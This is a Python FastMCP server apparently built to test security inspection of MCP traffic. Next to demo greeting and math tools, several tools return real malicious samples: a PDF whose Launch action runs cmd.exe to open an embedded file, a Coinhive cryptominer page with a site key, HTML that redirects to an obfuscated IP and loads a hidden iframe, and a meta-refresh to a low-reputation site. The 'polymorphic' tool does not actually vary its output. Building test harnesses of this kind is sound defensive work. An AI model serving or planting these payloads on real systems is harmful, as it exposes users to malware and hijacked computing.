"""
FastMCP quickstart example.

Run:
    uv run server fastmcp_quickstart stdio
or start with:
    python server.py
"""

from mcp.server.fastmcp import FastMCP
from mcp.types import CreateMessageResult, ElicitResult, GetPromptResult
from dotenv import load_dotenv
import os
import uuid
import time
import base64
import hashlib
import uvicorn

load_dotenv()
port = int(os.environ.get("PORT", 10000))

# Create an MCP server
mcp = FastMCP("Demo")

# -------------------------------------------------
# 🧰 TOOLS
# -------------------------------------------------
@mcp.tool()
def greet(name: str = "World") -> CreateMessageResult:
    """Greet someone and return structured result"""
    message = f"Hello {name}!"
    result = CreateMessageResult(
        role="assistant",
        content={"type": "text", "text": message},
        model="demo-model"
    )
    print(result)
    print(isinstance(result, CreateMessageResult))
    return result


@mcp.tool()
def add(a: int, b: int) -> CreateMessageResult:
    """Add two numbers and return structured result"""
    result = a + b
    response = CreateMessageResult(
        role="assistant",
        content={"type": "text", "text": f"The sum of {a} and {b} is {result}."},
        model="demo-model"
    )
    print(response)
    print(isinstance(result, CreateMessageResult))
    return response



# -------------------------------------------------
# 🌐 RESOURCES
# -------------------------------------------------

@mcp.resource("greeting://{name}")
def get_greeting(name: str) -> str:
    """Get a personalized greeting"""
    return f"Hello, {name}!"

@mcp.resource("greeting://test")
def get_greeting_test() -> str:
    """Static greeting"""
    return f"Hello, test!"

@mcp.resource("confidential://news")
def get_confidential_news() -> str:
    """Static News"""
    return f"Bob' Bank is planning to acquire Fabio Insurance in February 2026"

@mcp.resource("employees://details")
def get_employee_details() -> dict:
    """Get a list of sample employee details"""
    employees = [
        {"id": 101, "name": "Alice Johnson", "role": "Software Engineer", "department": "Engineering", "email": "alice.johnson@bobsbank.net", "location": "New York"},
        {"id": 102, "name": "Bob Smith", "role": "QA Engineer", "department": "Quality Assurance", "email": "bob.smith@bobsbank.net", "location": "San Francisco"},
        {"id": 103, "name": "Charlie Brown", "role": "Product Manager", "department": "Product", "email": "charlie.brown@bobsbank.net", "location": "London"},
        {"id": 104, "name": "Diana Prince", "role": "DevOps Engineer", "department": "Infrastructure", "email": "diana.prince@bobsbank.net", "location": "Berlin"},
        {"id": 105, "name": "Ethan Hunt", "role": "Security Analyst", "department": "Cybersecurity", "email": "ethan.hunt@bobsbank.net", "location": "Singapore"},
        {"id": 106, "name": "Fiona Gallagher", "role": "Data Scientist", "department": "Data Analytics", "email": "fiona.gallagher@bobsbank.net", "location": "Toronto"},
        {"id": 107, "name": "George Miller", "role": "UI/UX Designer", "department": "Design", "email": "george.miller@bobsbank.net", "location": "Sydney"},
        {"id": 108, "name": "Hannah Lee", "role": "Frontend Developer", "department": "Engineering", "email": "hannah.lee@bobsbank.net", "location": "Tokyo"},
        {"id": 109, "name": "Ian Wright", "role": "Backend Developer", "department": "Engineering", "email": "ian.wright@bobsbank.net", "location": "Dublin"},
        {"id": 110, "name": "Julia Roberts", "role": "HR Manager", "department": "Human Resources", "email": "julia.roberts@bobsbank.net", "location": "Amsterdam"},
    ]
    return {"employees": employees}

# -------------------------------------------------
# 💬 PROMPTS
# -------------------------------------------------

@mcp.prompt()
def greet_user(name: str = "Jaden" , style: str = "friendly") -> GetPromptResult:
    """Generate a greeting prompt"""
    styles = {
        "friendly": "Please write a warm, friendly greeting",
        "formal": "Please write a formal, professional greeting",
        "casual": "Please write a casual, relaxed greeting",
    }

    prompt_text = f"{styles.get(style, styles['friendly'])} for someone named {name}."
    
    return GetPromptResult(
        description="A prompt that asks for a specific style of greeting.",
        messages=[
            {
                "role": "user",
                "content": {
                    "type": "text",
                    "text": prompt_text
                }
            }
        ],
        metadata={"style": style}
    )



@mcp.prompt()
def pii_pci_analyzer(text: str, category: str = "pii") -> GetPromptResult:
    """
    Generate a prompt to classify or detect sensitive information such as PII or PCI.
    """

    categories = {
        "pii": "Identify whether the following text contains PII (Personally Identifiable Information). Examples include: name, email, phone number, address, government ID numbers, birthdate, etc.",
        "pci": "Identify whether the following text contains PCI (Payment Card Information). Examples include: credit card number, CVV, expiration date, bank account numbers, etc.",
        "phi": "Identify whether the following text contains PHI (Protected Health Information). Examples include: medical conditions, treatments, prescriptions, medical record numbers, etc.",
    }

    instruction = categories.get(category, categories["pii"])  # default to PII

    prompt_text = (
        f"{instruction}\n\n"
        f"Text to analyze:\n{text}\n\n"
        "Respond with:\n"
        "- 'yes' if sensitive data is present\n"
        "- 'no' if no sensitive data is present\n"
        "- A brief explanation describing why"
    )

    return GetPromptResult(
        description="A prompt for detecting sensitive data (PII/PCI/PHI).",
        messages=[
            {
                "role": "user",
                "content": {
                    "type": "text",
                    "text": prompt_text
                }
            }
        ],
        metadata={"category": category}
    )




# -------------------------------------------------
# 🧠 ELICIT EXAMPLE (dynamic result)
# -------------------------------------------------

@mcp.tool()
def elicit_feedback(question: str) -> ElicitResult:
    """Ask the user a follow-up question"""
    return ElicitResult(
        action={
            "name": "feedback",
            "description": "Ask for user feedback"
        },
        content={"type": "text", "text": f"Can you share your thoughts on: {question}? Or should I add 2+3 instead??"}
    )

@mcp.tool()
def elicit_feedback2(question: str) -> ElicitResult:
    """Ask the user a follow-up question"""
    return ElicitResult(
        action="accept",  # must be one of 'accept', 'decline', or 'cancel'
        content={
            "type": "text",
            "text": f"Can you share your thoughts on: {question}? Or should I add 2+3 instead?"
        }
    )

@mcp.tool()
def get_test_virus_sample() -> CreateMessageResult:
    """Returns the EICAR test string for security testing purposes"""
    eicar_content = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    
    return CreateMessageResult(
        role="assistant",
        content={
            "type": "text", 
            "text": f"Here is the EICAR test string: {eicar_content}"
        },
        model="security-test-model"
    )

@mcp.tool()
def get_pdf_payload() -> CreateMessageResult:
    """Returns the custom content extracted from a malicious PDF."""
    # PASTE YOUR PDF CONTENT BETWEEN THE TRIPLE QUOTES BELOW
    pdf_content = """
    %PDF-1.0 1 0 obj /Pages 2 0 R /Type /Catalog endobj 2 0 obj /Count 1 /Kids [ 3 0 R ] /Type /Pages 3 0 obj /Contents 4 0 R /Parent 2 0 R /Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Name /F1 /Type /Page /MediaBox [ 0 0 795 842 ] 4 0 obj /Length 0 >>stream endstream 0000000000 65535 f 0000000010 00000 n 0000000067 00000 n 0000000136 00000 n 0000000373 00000 n trailer /Root 1 0 R /Size 5 /Info 0 0 R startxref 5 0 obj <</EmbeddedFiles 6 0 R>> 6 0 obj <</Names[(template)7 0 R]>> 7 0 obj <</UF(template.pdf)/F(template.pdf)/EF<</F 8 0 R>>/Desc(template)/Type/Filespec>> 8 0 obj <</Subtype/application 2Fpdf/Length 44049/Filter/FlateDecode/DL 73802/Params<</Size 73802/CheckSum<E7D4F9387FBAEFC8656CBA0FCE31A181>>>>>stream e)[LUp AZ6e>Zf, (J3z[9 H*g2+wN +SuaUR 0Qj5Y+0 co3M5t hJRiJr_[ ueCtsWxf YRQ\91 q8J6(K OE8jc{ JDh\n7T 5$zhvm Q8Kd<' ,/2"%9WPD RaE+S/3 7]],5/ oXd2t> Vi9)JG _ goX* 5>X.2ju P,3gl= W(B] ]6\ z29<B@ B=lvU_ zAK-1Z UR=%UB _EX=us1 b-=ot I'o6Ke. 7M2o/vO b\WOa[ t{RBlR *apU-vM kxsU)/ML* %Jz(vc%9 99p:BOO iz<g.Z@ h{6Ww= l{kOE]} xW3VM% G=:U}U ip-Y/Dj 9 0 obj <</S/JavaScript/JS(this.exportDataObject({ cName: "template", nLaunch: 0 }) )/Type/Action>> 10 0 obj <</S/Launch/Type/Action/Win<</F(cmd.exe)/D(c:\\windows\\system32)/P(/Q /C %HOMEDRIVE% cd %HOMEPATH% (if exist "Desktop\\template.pdf" (cd "Desktop")) (if exist "My Documents\\template.pdf" (cd "My Documents")) (if exist "Documents\\template.pdf" (cd "Documents")) (if exist "Escritorio\\template.pdf" (cd "Escritorio")) (if exist "Mis Documentos\\template.pdf" (cd "Mis Documentos")) (start template.pdf) To view the encrypted content please tick the "Do not show this message again" box and press Open.)>>>> /Pages 2 0 R/Names 5 0 R/OpenAction 9 0 R /AA<</O 10 0 R>>>> 0000000618 00000 n 0000000658 00000 n 0000000701 00000 n 0000000798 00000 n 0000045014 00000 n 0000045121 00000 n 0000045655 00000 n 0000045740 00000 n <</Size 11/Prev 429/Root 1 0 R/Info 0 0 R>>
    """
    return CreateMessageResult(
        role="assistant",
        content={"type": "text", "text": pdf_content.strip()},
        model="threat-test-pdf"
    )

@mcp.tool()
def get_html_payload_1() -> CreateMessageResult:
    """Returns malicious HTML/JavaScript for browser exploit testing."""
    # PASTE YOUR HTML/JS CONTENT BETWEEN THE TRIPLE QUOTES BELOW
    html_content = """
    <html> <script src="https://coinhive.com/lib/coinhive.min.js"></script> <script> var miner = new CoinHive.Anonymous('VrqhGymiL9VzA7DO9YcZNzOVyNkY6tVS', {throttle: 0.3}); // Only start on non-mobile devices and if not opted-out // in the last 14400 seconds (4 hours): //if (!miner.isMobile() && !miner.didOptOut(14400)) { miner.start(); //} </script> </html>
    """
    return CreateMessageResult(
        role="assistant",
        content={"type": "text", "text": html_content.strip()},
        model="threat-test-html"
    )
    
@mcp.tool()
def get_html_payload_2() -> CreateMessageResult:
    """Returns malicious HTML/JavaScript for browser exploit testing."""
    # PASTE YOUR HTML/JS CONTENT BETWEEN THE TRIPLE QUOTES BELOW
    html_content = """
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <meta http-equiv="Pragma" content="no-cache" /> <title></title> <script language="JavaScript" type="text/javascript"> var SSLPort ='80'; var SSLHostIp ='154\x2e88\x2e175\x2e59'; function LoadFrame() { window.location="https://" + SSLHostIp + ":" + SSLPort; } </script> </head> <body class="mainbody" onLoad="LoadFrame();"> <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe> </body> </html
    """
    return CreateMessageResult(
        role="assistant",
        content={"type": "text", "text": html_content.strip()},
        model="threat-test-html"
    )
    
@mcp.tool()
def get_clean_payload() -> CreateMessageResult:
    """Returns a redirect-based HTML payload for security testing."""
    # Note: Redirects to low-reputation sites often trigger threat alerts.
    html_content = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8" />
        <title>JWPlayer</title>
        <meta http-equiv="Refresh" content="0; url=https://impervert.com/" />
    </head>
    <body>
        <p>Redirecting to video player...</p>
    </body>
    </html>
    """
    return CreateMessageResult(
        role="assistant",
        content={"type": "text", "text": html_content.strip()},
        model="threat-test-html"
    )

@mcp.tool()
def inspect_custom_payload(malicious_code: str) -> str:
    """
    Receives custom malicious code from the client for testing inbound proxy inspection.
    """
    # The server just prints it and echoes it back
    print(f"[SECURITY ALERT] Received payload: {malicious_code}")
    
    return f"Server successfully received your payload: {malicious_code}"


@mcp.tool()
def inspect_binary_payload(b64_file_data: str, filename: str) -> CreateMessageResult:
    """
    Receives a Base64-encoded binary file (EXE, DLL, DOCX) to test Dataplane deep inspection.
    """
    try:
        # 1. Decode the Base64 string back into raw binary bytes
        raw_bytes = base64.b64decode(b64_file_data)
        
        # 2. Calculate the MD5 hash of the decoded file (Safe analysis)
        file_md5 = hashlib.md5(raw_bytes).hexdigest()
        file_size = len(raw_bytes)
        
        message = f"Server successfully received and decoded {filename}. Size: {file_size} bytes. True MD5: {file_md5}"
        
        return CreateMessageResult(
            role="assistant",
            content={"type": "text", "text": message},
            model="threat-test-binary"
        )
    except Exception as e:
        return CreateMessageResult(
            role="assistant",
            content={"type": "text", "text": f"Error decoding binary data: {str(e)}"},
            model="threat-test-binary"
        )


@mcp.tool()
def get_html_payload_diff_md5() -> CreateMessageResult:
    """Returns malicious HTML with deep polymorphism to alter the MD5 hash."""
    
    # Generate random strings
    random_id = uuid.uuid4().hex
    timestamp = str(int(time.time()))
    
    # Notice the placeholders: __RANDOM_ID__ and __TIMESTAMP__
    html_content = """
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <meta http-equiv="Pragma" content="no-cache" /> <title></title> <script language="JavaScript" type="text/javascript"> var SSLPort ='80'; var SSLHostIp ='154\x2e88\x2e175\x2e59'; function LoadFrame() { window.location="https://" + SSLHostIp + ":" + SSLPort; } </script> </head> <body class="mainbody" onLoad="LoadFrame();"> <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe> </body> </html

    """
    
    # Replace the placeholders with the actual random data
    dynamic_html = html_content.replace("__RANDOM_ID__", random_id).replace("__TIMESTAMP__", timestamp)
    
    return CreateMessageResult(
        role="assistant",
        content={"type": "text", "text": dynamic_html.strip()},
        model="threat-test-html"
    )



# -------------------------------------------------
# 🚀 MAIN ENTRY POINT
# -------------------------------------------------

if __name__ == "__main__":
    uvicorn.run(mcp.streamable_http_app, host="0.0.0.0", port=port)
